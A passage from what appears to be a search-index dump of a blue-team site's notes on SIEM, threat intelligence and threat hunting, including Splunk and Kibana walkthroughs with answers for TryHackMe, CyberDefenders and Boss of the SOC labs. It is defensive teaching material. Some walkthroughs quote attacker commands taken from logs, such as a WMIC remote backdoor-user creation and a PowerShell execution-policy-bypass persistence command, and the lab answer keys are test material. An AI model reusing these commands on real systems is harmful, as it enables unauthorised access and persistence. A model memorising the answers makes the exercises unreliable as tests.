    "c": "lsass.exe  Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. It also writes to the Windows Security Log. It creates security tokens for SAM (Security Account Manager), AD (Active Directory), and NETLOGON. It uses authentication packages specified in HKLM\\System\\CurrentControlSet\\Control\\Lsa . Lsass.exe is another process adversaries target. Common tools such as mimikatz are used to dump credentials, or adversaries mimic this process to hide in plain sight. Again, they do this by either naming their malware by this process name or simply misspelling the malware slightly. Normal  Image Path: %SystemRoot%\\System32\\lsass.exe Parent Process: wininit.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  A parent process other than wininit.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM Resources  How LSASS is maliciously used and additional features that Microsoft has put into place to prevent these attacks",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0b44ea271e110bb4b6d08b319e50f8fd",
    "u": "https://siem.tymyrddin.dev/",
    "t": "Security information and event management ",
    "c": "Security information and event management  These are notes and challenges on security information and event management (SIEM), vulnerability management, threat intelligence and management, and on threat hunting. Threat hunting is complementary to the standard process of incident detection, response, and remediation, and is the practice of proactively searching for cyber threats that may be hidden in a network. Tools @Testlab Security information and event management tools Threat intelligence tools Threat hunting tools Vulnerability management tools Notes Introduction Incident prevention Threat intelligence lifecycle Pyramid of pain Cyber kill chain MITRE ATT&CK framework Unified kill chain Diamond model Incident handling (NIST) Standards of communication SIEM stack Threat hunting Code Security Detectors for Wazuh (Mock Mode) An investigation with Splunk Introduction I am really not batman Reconnaissance phase Exploitation phase Installation phase Action on objectives Command and control phase Weaponisation phase Delivery phase TryHackMe rooms Introduction VPN logs ItsyBitsy Investigating with Splunk Benign CaddyWiper and APT37 Zerologon CyberDefenders challenges Introduction GrabThePhisher L’espion Intel101 CaseVegas CyberCorp Case 2 Boss of the SOC v2 Introduction Data dive Web activity investigation Detecting SQL and XSS web application attacks USB attack investigation Investigating FTP Resources Introduction Threat maps Feeds Blogs Reports Marketplaces Books ",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "dbdbd3e23c2250752ff6ef6c4af11916",
    "u": "https://siem.tymyrddin.dev/docs/notes/standards",
    "t": "Standards of communication ",
    "c": "Standards of communication  Standardisation of communication on evidence-based information currenly includes: Mechanisms of an attack How to detect an attack Impact of different types of attacks Action-oriented advice about how to defend against attacks Purpose is to achieve consistently high levels of: Clarity Measurability Quality Repeatability & error susceptibility Portability & transferability Automation Productivity TAXII  The Trusted Automated eXchange of Indicator Information (TAXII) defines protocols for securely exchanging threat Intel to have near real-time detection, prevention and mitigation of threats. The protocol supports two sharing models: Collection: Threat intel is collected and hosted by a producer upon request by users using a request-response model. Channel: Threat intel is pushed to users from a central server through a publish-subscribe model. STIX  Structured Threat Information Expression (STIX) is a language developed for the “specification, capture, characterisation and communication of standardised cyber threat information”. It provides defined relationships between sets of threat info such as observables, indicators, adversary TTPs, attack campaigns, and more. Attack trees  Attack trees are conceptual diagrams showing how an asset, or target, might be attacked. These are multi-level diagrams consisting of one root node, leaves, and children nodes. Bottom to Top, child nodes are conditions that must be satisfied to make the direct parent node true. An attack is considered complete when the root is satisfied. Each node may be satisfied only by its direct child nodes. Attack on a password. Credit: Rajesh Kumar Suppose there is 1 grandchild below the root node. In such a case multiple steps must be taken to carry out an attack as first the grandchild’s conditions must be satisfied for the direct parent node to be true and then the direct parent node condition must be satisfied to make the root node true. It also has AND and OR options which represent alternatives and different steps towards achieving that goal. Commercial tools like SecurITree, AttackTree+ and opensource tools like ADTool, Ent, and SeaMonster can be used to model attack trees. And since this is just about drawing boxes, a simple drawing tool will also do. Writing out the tree in lists is another very common option and can suffice.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7209ef317bbafe08f6db2863863288a5",
    "u": "https://siem.tymyrddin.dev/docs/resources/maps",
    "t": "Threat maps ",
    "c": "Threat maps  While these threat maps have no practical usage for defence, threat maps can be used to study past attack styles. Plus, some are beautiful and/or fun to watch. Mind that the source of an attack is often forged, which means that it appears as though it was initiated from a certain country, but it is not from that country at all. The largest attacks usually originate from high bandwidth nations, who are perfectly suited to launching huge attacks from thousands of infected devices directed from other locations. LookingGlass Phishing/Malicious URL Map with live activity for infected malicious and phishing domain URLs. ThreatCoud Live Cyber Attack Threat Map showing DDoS attacks from around the globe with live stats for recent attacks. Arbor Networks DDoS Attack Map tracking down attack episodes related to DDoS attacks around the world. Kaspersky Cyber Malware and DDoS Real-Time Map signifying internet devastation in extremely sleek ways. Akamai Real-Time Web Attack Monitor with real-time stats pinpointing the sources of most of the biggest attacks anywhere around the globe. Fortinet Threat Map showing malicious network activity within various geographic regions and international sources of attack and their destinations. Threat Butt Hacking Attack Map with lots of humour!",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e40f2fb76d6f1c0fb8fc571bd65f6121",
    "u": "https://siem.tymyrddin.dev/docs/thm/vpn",
    "t": "VPN logs ",
    "c": "VPN logs  Upload the VPN_logs data in Splunk, and create an index VPN_Logs . How many events are present in the log file? Answer: 2862 How many log events by the user Maleena are captured? Answer: 60 What is the name associated with IP 107.14.182.38 ? Answer: Smith What is the number of events that originated from all countries except France? Answer: 2814 How many VPN Events were observed by the IP 107.3.206.58? Answer: 14",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "46c6d939cc0fd307fa03d17400536eb5",
    "u": "https://siem.tymyrddin.dev/docs/incident/objectives",
    "t": "Action on objectives ",
    "c": "Action on objectives  As the website was defaced due to a successful attack by the adversary, it would be helpful to understand better what ended up on the website that caused defacement. The first quest could be to figure out the traffic flow. Examine the Suricata log source and the IP addresses communicating with the webserver 192.168.250.70 . index=botsv1 dest=192.168.250.70 sourcetype=suricata To change the flow direction to see if any communication originates from the server: index=botsv1 src=192.168.250.70 sourcetype=suricata Three external IPs appear, towards which the web server initiates the outbound traffic. There is a large chunk of traffic going to these external IP addresses, which could be worth checking. Pivot into the destination IPs one by one to see what kind of traffic/communication is being carried out: index=botsv1 src=192.168.250.70 sourcetype=suricata dest_ip=23.22.63.114 The url field shows 2 .php files and one .jpeg file. This jpeg file looks interesting. To see where this jpeg file came from: index=botsv1 url=\"/poisonivy-is-coming-for-you-batman.jpeg\" dest_ip=\"192.168.250.70\" | table _time src dest_ip http.hostname url The end result shows poisonivy-is-coming-for-you-batman.jpeg was downloaded from the attacker’s host prankglassinebracket.jumpingcrab.com . Questions  What is the name of the file that defaced the imreallynotbatman.com website? poisonivy-is-coming-for-you-batman.jpeg Fortigate Firewall fortigate_utm detected SQL attempt from the attacker’s IP 40.80.148.42 . What is the name of the rule that was triggered during the SQL Injection attempt? index=botsv1 src=40.80.148.42 sourcetype=fortigate_utm Add the attack field to the fields and: HTTP.URI.SQL.Injection",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "6693bc3cca53217bef5e16e3f29b1a7f",
    "u": "https://siem.tymyrddin.dev/docs/cd/cybercorp2",
    "t": "CyberCorp Case 2 ",
    "c": "CyberCorp Case 2  The CyberCorp Case 2 challenge was created by Vadim Khrykov and his team , and is based on a real-world attack. Scenario  After a cybersecurity incident, CyberCorp’s management decided to purchase and deploy EDR (Endpoint Detection and Response) solution. EDR agents were installed on all workstations and servers and forwarded telemetry to a centralized Threat Hunting platform. The company has also hired a security blue team of highly qualified analysts to build a threat detection process using the Threat Hunting approach. You will have to try on the role of a threat hunter, who decided to verify the hypothesis about one of the attacker’s persistence techniques. Unfortunately, the hypothesis was confirmed, and a persistence technique was discovered on one host, which eventually became the starting point of the investigation. By analyzing the EDR telemetry in the Threat Hunting platform, you will have to understand how the attacker compromised the network and what he managed to do with the obtained access. Resources  Threat Hunting. Why might you need it Threat Hunting in action Hunting for advanced Tactics, Techniques and Procedures (TTPs) Tools  Kibana Setting up  Download the VM, watch the vid , import, change network settings, start the VM. Open Firefox, and click on the Kibana bookmark. Update time range to last 3 years. Questions  Q1 The Threat Hunting process usually starts with the analyst making a hypothesis about a possible compromise vector or techniques used by an attacker. In this scenario, your initial hypothesis is as follows: “The attacker used the WMI subscription mechanism to obtain persistence within the infrastructure”. Verify this hypothesis and find the name of the WMI Event Consumer used by the attacker to maintain his foothold. Sample answer: Consumer Hypothesis: Event Triggered Execution: Windows Management Instrumentation Event Subscription ( Atomic Red Team ID: T1546.003 ). Time of Event: Jun 21, 2021 @ 23:25:50.000 Host: DESKTOP-BZ202CP.cybercorp.com User: CYBERCORP\\john.goldberg Process ID: 5772 CommandLineEventConsumer.Name: PowerControl Consumer Related event ID’s (IoC’s): Event ID 19: WmiEvent (WmiEventFilter activity detected); Event ID 20: WmiEvent (WmiEventConsumer activity detected), and Event ID 21: WmiEvent (WmiEventConsumerToFilter activity). Q2 In the previous step, you looked for traces of the attacker’s persistence in the compromised system through a WMI subscription mechanism. Now find the process that installed the WMI subscription. Answer the question by specifying the PID of that process and the name of its executable file, separated by a comma without spaces. Sample answer: 1200,program.exe. Look for a process just prior to the WMI subscription. Q3 “The process described in the previous question was used to open a file extracted from the archive that user received by email. Specify a SHA256 hash of the file extracted and opened from the archive. Sample answer: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855” The opened file was extracted from an archive received by email: proc_id:5772 AND event_type: FileOpen AND (*zip* OR *rar*) Gives: Process 'c:\\program files (x86)\\microsoft office\\office16\\outlook.exe' created file 'c:\\users\\john.goldberg\\appdata\\local\\microsoft\\windows\\inetcache\\content.outlook\\dfn3sfep\\report.zip' The archive report.zip was opened via email using the program outlook.exe . 'c:\\windows\\explorer.exe' ➔ 'c:\\program files (x86)\\microsoft office\\office16\\winword.exe' ➔ 'c:\\users\\john.goldberg\\appdata\\local\\temp\\temp1_report.zip\\market forecast emea.docx'`. Market forecaste emea.docx was opened via winword.exe and the temporary folder for it is temp1_report.zip . The hash for this .docx file is the answer: Q4 The file mentioned in question 3, is not malicious in and of itself, but when it is opened, another file is downloaded from the Internet that already contains the malicious code. Answer the question by specifying the address, from which this file was downloaded, and the SHA256 hash of the downloaded file, separated by commas without spaces. Sample answer: 192.168.0.1,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 The enrich processor can enrich documents with data from another index. The enrich.ioa.* set of fields indicate suspiciousness. For example, setting enrich.ioa.max_severity to exists , the results show events that are high , medium , or low . Setting the enrich.ioa.max_confidence: exists filter, the level of confidence that a particular event is malicious is indicated. To look for a sequence of events Network Connection -> File Created (file downloaded) -> File Open : proc_id:5772 AND (event_type: NetworkConnection OR event_type: \"FileCreate\" OR event_type: \"FileOpen\") These could be artifacts of a remote dotm template injection attack. fontstyles[1].dotm is a malicious file downloaded from 188.135.15.49 . This IP address is listed as malicious/malware on VirusTotal . Q5 The malicious code from the file, mentioned in question 4, directly installed a WMI subscription, which we started our hunting with, and also downloaded several files from the Internet to the compromised host. For file downloading, the attacker used a tricky technique that gave him the opportunity to hide the real process, which initiated the corresponding network activity. Specify the SHA256 hash of the operating system component whose functionality was used by the attacker to download files from the Internet. Sample answer: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 The “Hunting for advanced Tactics, Techniques and Procedures (TTPs)” article refers to a technique in which Internet Explorer COM objects are used in scripts or macros to interact with Internet resources. Parent child process dechaining takes place which may help evade some EDRs. This technique appears to have been used here: winword.exe loads ieproxy.dll followed by DNS request(s). The hash of the ieproxy.dll is the answer. Q6 Specify the domain name of the resource from which the files mentioned in question 5 were supposedly downloaded as a result of malicious code execution. Sample answer: sub.domain.com Checking for event_type = DNSReq , adding the field enrich.domaininfo.dns_rname.domain and applying the enrich.ioa.rules filter, shows DNS requests to GitHub via iexplorer.exe . Q7 The first file downloaded (as a result of executing the code in question 5) contained encoded executable code (PE), which after downloading was recorded in the registry. Specify an MD5 hash of the original representation of that code (PE). Sample answer: d41d8cd98f00b204e9800998ecf8427e Using event_type: RegistryValueSet and expanding the first entry gives a base64 encoded string marked win_gzipped_data_as_reg_value_data and reg_value_data stores the registry data. Using CyberChef with the recipes From Base64 -> Gunzip -> MD5 gives the hash of the PE. Q8 The second file downloaded (as a result of code execution, which we talked about in question 5) was a script, that was set up to autostart via WMI Subscription. Specify the SHA256 hash of this script. Sample answer: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 Looking at events after the WMI subscription event for malicious script downloads with the enrich.ioa.max_confidence: exist filter: At 23:26:09 , the file MSO1033.ps1 was downloaded and stored in C:\\Users\\john.goldberg\\AppData\\Roaming\\Microsoft\\Office\\ , after which a WMI subscription was set ( event_type = WMIConsumerCreate ). The goal of this WMI object is to run the command: powershell.exe -noP -ep bypass iex -c \"('C:\\Users\\john.goldberg\\AppData\\Roaming\\Microsoft\\Office\\MSO1033.ps1')\" The hash of MSO1033.ps1 is the answer. Q9 The script, mentioned in question 8, spawned one of the legitimate system processes and injected into its memory a malicious code that was read and decoded from the registry (this code was mentioned in question 7). This malicious...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0b23a140897495b004fd60404f56e5b3",
    "u": "https://siem.tymyrddin.dev/docs/incident/deliver",
    "t": "Delivery phase ",
    "c": "Delivery phase  We have identified various IP addresses, domains and Email addresses associated with this adversary. Attackers create malware and infect devices to gain initial access or evade defenses and find ways to deliver it through different means. This investigation phase would be to use the information we have about the adversary and use various Threat Hunting platforms and OSINT sites to find any malware linked with the adversary. Threat Intel report suggested that this adversary group Poison lvy appears to have a secondary attack vector in case the initial compromise fails. Our objective would be to understand more about the attacker and their methodology and correlate the information found in the logs with various threat Intel sources. OSINT sites  Virustotal ThreatMiner Hybrid-Analysis Questions  What is the HASH of the Malware associated with the APT group? c99131e0169171935c5ac32615ed6261 What is the name of the Malware associated with the Poison Ivy Infrastructure? MirandaTateScreensaver.scr.exe",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a14dc291c0fcb67bb2dd905fbb41b3ec",
    "u": "https://siem.tymyrddin.dev/docs/bots/400",
    "t": "Investigating FTP ",
    "c": "Investigating FTP  A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor? index=\"botsv2\" sourcetype=\"stream:SMTP\" *.zip | reverse The second email looks promising. Open the raw text, and bingo! Answer: invoice.zip What is the password to open the zip file? Scroll further down: Answer: 912345678 The Taedonggang APT group encrypts most of their traffic with SSL. What is the “SSL Issuer” that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces. The IP address used here was identified in Detecting SQL and XSS web application attacks . index=\"botsv2\" sourcetype=\"stream:TCP\" 45.77.65.211 Answer: C = US What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment? index=\"botsv2\" sourcetype=\"stream:FTP\" method=RETR | reverse Answer: 나는_데이비드를_사랑한다.hwp What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim’s workstation? Answer example: John Smith Hybrid Analysis -> VirusTotal -> Answer: Ryan Kovar Within the document, what kind of points is mentioned if you found the text? Any.run -> Answer: CyberEastEgg To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html index=\"botsv2\" schtasks.exe sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" | dedup ParentCommandLine | table ParentCommandLine CommandLine That gives path to query in registry: index=\"botsv2\" source=\"winregistry\" \"\\\\Software\\\\Microsoft\\\\Network\" For these events, decode the base64 data in cyberchef, until answer is found. Answer: process.php",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3093a4b968e7114aaf35acd2632c807f",
    "u": "https://siem.tymyrddin.dev/docs/incident/weaponise",
    "t": "Weaponisation phase ",
    "c": "Weaponisation phase  We have found a domain prankglassinebracket.jumpingcrab.com and IP addresses associated with the attacker during the investigations. In the weaponisation phase, the adversaries would: Create Malware/Malicious document to gain initial access/evade detection etc. Establish domains similar to the target domain to trick users. Create a Command and Control Server for the post-exploitation communication/activity etc. Use OSINT to find out more about the attacker. Tools used  Robtex is a Threat Intel site that provides information about IP addresses, domain names, etc. ThreatCrowd is a Search Engine for Threats that provides intel based on the IP, domain, email address, etc. Virustotal is an OSINT site used to analyze suspicious files, domains, IP, etc. Domaintools gives whois information on sites. Questions  What IP address has P01s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises? 23.22.63.114 Based on the data gathered from this attack and common open-source intelligence sources for domain names, what is the email address that is most likely associated with the P01s0n1vy APT group? lillian.rose@po1s0nvy.com",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "5fff2b1bfa2c50d2fb2b0c7b45512afb",
    "u": "https://siem.tymyrddin.dev/docs/cd/casevegas",
    "t": "CaseVegas ",
    "c": "CaseVegas  Scenario  In this CyberDefenders challenge you are a SOC analyst, and you have been instructed to find a suspect who was employed in a major hotel chain and was responsible for the theft of US$ 3.5 million from his employers. When you were given the instruction, you were busy with another investigation and immediately abandoned that to start this new investigation. You were also meant to be home hours ago to take your loved one to a nice restaurant for a well-deserved dinner and relaxation time. During the investigation, your attempt to find the suspect was recorded in the included video. Analyze the video and other files and try to extract answers for some of the case questions. Instructions:  Unzip the challenge (pass: cyberdefenders.org) Use a media player like VLC so you can increase video playing speed to save your time. We recommend going through all questions once before answering questions. This way, you can watch the video evidence file once and extract answers. Tools used  Google maps DuckDuckGo Google Street View Questions  Q1 File->Vehicle-number.png: At which minute of the video was the vehicle observed? 35 minutes Q2 File->Vehicle-number.png: What is the zip code of the place where the vehicle was observed in the video.? Address OASIS Hotel on the left in the screen Q3 File->Chapel: This chapel has a live webcam. What is the name of the chapel? At 27:33 in the vid, the name can be read. Officially it is called The Little Chapel of Hearts , but the answer to the question that worked was Elvis Wedding Chapel. Q4 File->Chapel: What strip hotel does the chapel have a view of? Q5 What date did the Mandalay Bay shooting take place? 01/10/2017 Q6 On 30/09/2017 at 14:47, Stephen Paddock was seen on CCTV footage. Where was he? In the Footage of Stephen Paddock before October 1 shooting at 59:24, we can see him in an elevator: Q7 File->Vehicle.png: This vehicle may be related to our investigation. What place did it go to? In the video given by the challenge at 30:52 minutes, the car turns right behind the Tux & Gown. Q8 Find MGM financial report in the form of a PDF document (not website) which contains the words: ‘Consolidated net revenues increased 13% compared to the prior-year Quarter to $3.2 billion’ Submit the URL as an answer. Don’t try with DuckDuckGo. Use Google . Q9 File->Number: What is the complete number? From 33:12 onward, look behind the “Wedding Chapel sign”: Q10 File->Number: Who is the number’s owner? DuckDuckGo 702-735-5700 Vegas Q11 What is New York-New York? DuckDuckGo New York-New York Las Vegas Q12 In 2018, a famous hacking conference was held in Las Vegas. Who was the keynote speaker? BlackHat 2018 keynote speaker Q13 File->Devil.png: What does this belong to? The Devil is in the detail. Provide the tower name. From 34:00 onward look in Tower at windows. It is the Ogden . Q14 At which minute of the video was The Deuce (Las vegas bus) observed? 34 minutes Q15 File->Location: What does this belong to? At 25:22, on the left. Use the full name of the Strat. Q16 The sign at 36.131749, -115.164647 is advertising what show? Use Google Street View, then at 21:34 in the vid it is readable. Q17 Files->Person-2: At which minute of the video did you see this person? At 11:03 on the right. Q18 Facebook ID 250240925003365 is linked to a criminal group. What are they called? Facebook ID 250240925003365",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "35a76f8e71c80b35b23b61d7c5dd024c",
    "u": "https://siem.tymyrddin.dev/docs/notes/diamond",
    "t": "Diamond model ",
    "c": "Diamond model  The diamond model of intrusion analysis is an approach to authenticate and track cyber threats. In this approach, every incident is depicted as a diamond. The methodology underlines the relationships and characteristics of four components of the diamond: adversary, capability, infrastructure, and victim. These four core elements are connected in relationship between each other which can then be analytically examined to further uncover insights and gain knowledge of malicious activities. Empire’s capabilities and infrastructure, as well as the dependencies or tactics that enable them. The diamond model of intrusion analysis illustrates that an adversary uses a capability over an infrastructure against a victim . Adversary  An adversary is an organisation or threat actor responsible for leveraging a capability against a victim to fulfill its goals. The adversary is the person who stands behind the cyberattack. The distinction between adversary operator and adversary makes intent, attribution, adaptability, and persistence clear by helping to frame the relationship between an adversary and victim pair. It is difficult to identify an adversary during the first stages of a cyberattack. Using data collected from an incident or breach, signatures, and other relevant information can help determine who the adversary might be. Adversary Operator is the hacker or person(s) conducting the intrusion activity. Adversary Customer is the entity that stands to benefit from the activity in the intrusion. It may be the same person who stands behind the adversary operator, or it may be a separate person or group. An adversary customer could control different operators simultaneously. Each operator might have its capabilities and infrastructure. Capability  The capabilities refer to the tools and techniques used by an adversary in an event. It highlights the adversary’s tactics, techniques, and procedures (TTPs) and includes all techniques used to attack the victims, from the less sophisticated methods, such as manual password guessing, to the most sophisticated techniques, like developing malware or a malicious tool. Capability Capacity is all the vulnerabilities and exposures that the individual capability can use. An Adversary Arsenal is a set of capabilities that belong to an adversary. The combined capacities of an adversary’s capabilities make it the adversary’s arsenal. An adversary must have the required capabilities. The capabilities can be malware and phishing email development skills or, at least, access to capabilities, such as acquiring malware or ransomware as a service. Infrastructure  The infrastructure includes the physical or logical communication structures such as IP or e-mail addresses, domain names, and others, employed by an adversary to deliver a capability. Type 1 Infrastructure is the infrastructure controlled or owned by the adversary. Type 2 Infrastructure is the infrastructure controlled by an intermediary. Sometimes the intermediary might or might not be aware of it. This is the infrastructure that a victim will see as the adversary. Type 2 Infrastructure has the purpose of obfuscating the source and attribution of the activity. Type 2 Infrastructure includes malware staging servers, malicious domain names, compromised email accounts, etc. Service Providers are organisations that provide services considered critical for the adversary availability of Type 1 and Type 2 Infrastructures, for example, Internet Service Providers, domain registrars, and webmail providers. Victim  A victim is a target against whom attacks are initiated, vulnerabilities are exploited, or capabilities are used. It can be organisations, people, or assets, such as target email or IP addresses, domains, and so on. There is always a victim in every cyberattack. For example, the spear-phishing email (a well-crafted email targeting a specific person of interest) was sent to the company, and someone (victim) clicked on the link. In this case, the victim is the selected target of interest for an adversary. Victim Personae are the people and organisations being targeted and whose assets are being attacked and exploited. These can be organisation names, people’s names, industries, job roles, interests, etc. Victim Assets are the attack surface and include the set of systems, networks, email addresses, hosts, IP addresses, social networking accounts, etc., to which the adversary will direct their capabilities. Centered approaches  The model focuses on several trade-craft concepts of intrusion analysis which are referred to as ‘centered’ approaches. These approaches are centered on a certain feature of the diamond model to detect new malicious activities and expose activities related to the other relevant features. There are six centered approaches: adversary-centered, capability-centered, infrastructure-centered, victim-centered, social-political-centered, and technology centered. The first four focus on the diamond nodes while the remaining two focus on the meta-features of the diamond. Meta features  Meta-features are not required, but they can add some valuable information or intelligence to the Diamond Model. Timestamp - is the date and time of the event. Each event can be recorded with a date and time that it occurred, such as 2021-09-12 02:10:12.136. The timestamp can include when the event started and stopped. Timestamps are essential to help determine the patterns and group the malicious activity. For example, if the intrusion or breach happened at 3 am in the United States, it might be possible that the attack was carried out from a specific country with a different time zone and standard business hours. Phase - these are the phases of an intrusion, attack, or breach. An example can be the Cyber Kill Chain (CKC) developed by Lockheed Martin. For example, an attacker needs to do some research to discover the target or a victim. Then they would try to exploit the target, establish a command-and-control centre and, lastly, exfiltrate the sensitive information. Result - While the results and post-conditions of an adversary’s operations will not always be known or have a high confidence value when they are known, they are helpful to capture. The event results can be labelled as “success,” “failure,” or “unknown.” The event results can also be related to the CIA (confidentiality, integrity, and availability) triad, such as Confidentiality Compromised, Integrity Compromised, and Availability Compromised. Another approach can also be documenting all the post-conditions resulting from the event, for example, information gathered in the reconnaissance stage or successful passwords/sensitive data exfiltration. Direction - This meta-feature helps describe host-based and network-based events and represents the direction of the intrusion attack. The Diamond Model of Intrusion Analysis defines seven potential values for this meta-feature: Victim-to-Infrastructure, Infrastructure-to-Victim, Infrastructure-to-Infrastructure, Adversary-to-Infrastructure, Infrastructure-to-Adversary, Bidirectional or Unknown. Methodology - This meta-feature will allow an analyst to describe the general classification of intrusion, for example, phishing, DDoS, breach, port scan, etc. Resources - According to the Diamond Model, every intrusion event needs one or more external resources to be satisfied to succeed. Examples of the resources can include the following: software (e.g., operating systems, virtualisation software, or Metasploit framework), knowledge (e.g., how to use Metasploit to execute the attack and run the exploit), information (e.g., a username/password to masquerade), hardware (e.g., servers, workstations, routers), funds (e.g., money to purchase domains), facilities (e.g., electricity or shelter), access (e.g., a network path from the source host to the victim and vice versa, network access from an Internet Service Provider (ISP)). Social political  The...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0544a528a814fb04b51709184532f894",
    "u": "https://siem.tymyrddin.dev/docs/notes/pop",
    "t": "Pyramid of pain ",
    "c": "Pyramid of pain  The Pyramid of Pain is a conceptual model for the effective use of Cyber Threat Intelligence in threat detection operations, with a particular emphasis on increasing the adversaries' cost of operations. Hash Values  Most hash algorithms compute a message digest of the entire input, and output a fixed length hash that is unique to the given input. If the contents of two files varies even by a single bit, the resultant hash values of the two files are different. It is really easy to spot a malicious file if we have the hash in our arsenal. But as an attacker, it is trivial to modify a file by even a single bit, which would produce a different hash value. With so many variations and instances of known malware or ransomware, threat hunting using file hashes as the IOC (Indicators of Compromise) can become a difficult task. Fuzzy hashes attempt to solve this problem by computing hash values that take into account similarities in the input. Two files with only minor or moderate differences would have fuzzy hash values that are similar, allowing an investigator to note a possible relationship between them. IP Addresses  The most fundamental indicator. Short of data copied from local hard drive and leaving the front door on a USB key, you pretty much have to have an network connection of some sort in order to carry out an attack, and a connection means IP Addresses. And there are many. A common defense tactic is to block, drop, or deny inbound requests from IP addresses on your parameter or external firewall. This tactic is often not bulletproof as it is trivial for an experienced adversary to recover simply by using a new public IP address. If they are using Fast Flux, or an anonymous proxy service like Tor or something similar, they may change IP address quite frequently and never even notice or care. Domain Names  Domain names are slightly more of a pain to change, because in order to work, they must be registered, paid for (even if with stolen funds) and hosted somewhere. That said, there are a large number of DNS providers with not too impressive registration standards (even for free), so in practice it’s not too hard to change domains. New domains may take anywhere up to a day or two to be visible throughout the Internet, so these are slightly harder to change than just IP addresses. Network & Host Artifacts  On the Network and Host Artifacts level, the attacker will likely feel a little more annoyed and frustrated if you can detect the attack. The attacker would need to circle back at this detection level and change his attack tools and methodologies. This is very time-consuming for the attacker, and probably, he will need to spend more resources on his adversary tools. Host artifacts are the traces or observables that attackers leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (Indicators of Compromise), files dropped by malicious applications, or anything exclusive to the current threat. A network artifact can be a user-agent string, C2 information, or URI patterns followed by the HTTP POST requests. An attacker might use a User-Agent string that has not been observed in your environment before or seems out of the ordinary. Tools  At the Tools level, we are trying to impede the adversary’s ability to use one or more specific arrows in their quiver. Most likely this happens because we just got so good at detecting the artifacts of their tool in different ways, that they give up or have to find or create a new tool for the same purpose. This is a big win, because now they have to invest time in research (find an existing tool that has the same capabilities), development (create a new tool if they are able) and training (figure out how to use the tool and become proficient with it). You just cost them some real time, especially if you are able to do this across several of their tools. Some examples of tool indicators might include AV or Yara signatures, if they are able to find variations of the same files even with moderate changes. Network aware tools with a distinctive communication protocol may also fit at this level, where changing the protocol would require substantial rewrites to the original tool. And fuzzy hashes. Tactics, Techniques & Procedures  At the apex of the pyramid are the TTPs. Detecting and responding at this level means operating against adversary behaviours, not against their tools. If you can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back. For example, if you could detect a Pass-the-Hash attack using Windows Event Log Monitoring and remediate it, you would be able to find the compromised host very quickly and stop the lateral movement inside your network. From an effectiveness standpoint, this level is ideal. If you are able to respond to adversary TTPs quickly enough, you force them to do the most time-consuming thing possible: learn new behaviours. Or give up. Resources  The Pyramid of Pain SSDeep project",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d29702739739183779fa1668fd89da68",
    "u": "https://siem.tymyrddin.dev/docs/thm/investigation",
    "t": "Investigating with Splunk ",
    "c": "Investigating with Splunk  SOC Analyst Johny has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies. Questions  How many events were collected and Ingested in the index main? 12256 On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username? index=\"main\" EventID=4720 A1berto On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key? index=\"main\" A1berto Category=\"Registry object added or deleted (rule: RegistryEvent) |\" HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\A1berto\\ Examine the logs and identify the user that the adversary was trying to impersonate. Alberto What is the command used to add a backdoor user from a remote computer? index=\"main\" net user A1berto C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add A1berto paw0rd1\" How many times was the login attempt from the backdoor user observed during the investigation? 0 What is the name of the infected host on which suspicious Powershell commands were executed? index=\"main\" powershell James.browne PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution? index=\"main\" EventID=4103 79 An encoded Powershell script from the infected host initiated a web request. What is the full URL? index=\"main\" powershell Find encoded script in message. Copy encoded script to Cyberchef and decode. Find encoded part of url in script and decode again. Recombine with rest of url. Defang. hxxp[://]10[.]10[.]10[.]5/news[.]php",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d192cf4d85e2730ed90eca300729d023",
    "u": "https://siem.tymyrddin.dev/docs/incident/exploit",
    "t": "Exploitation phase ",
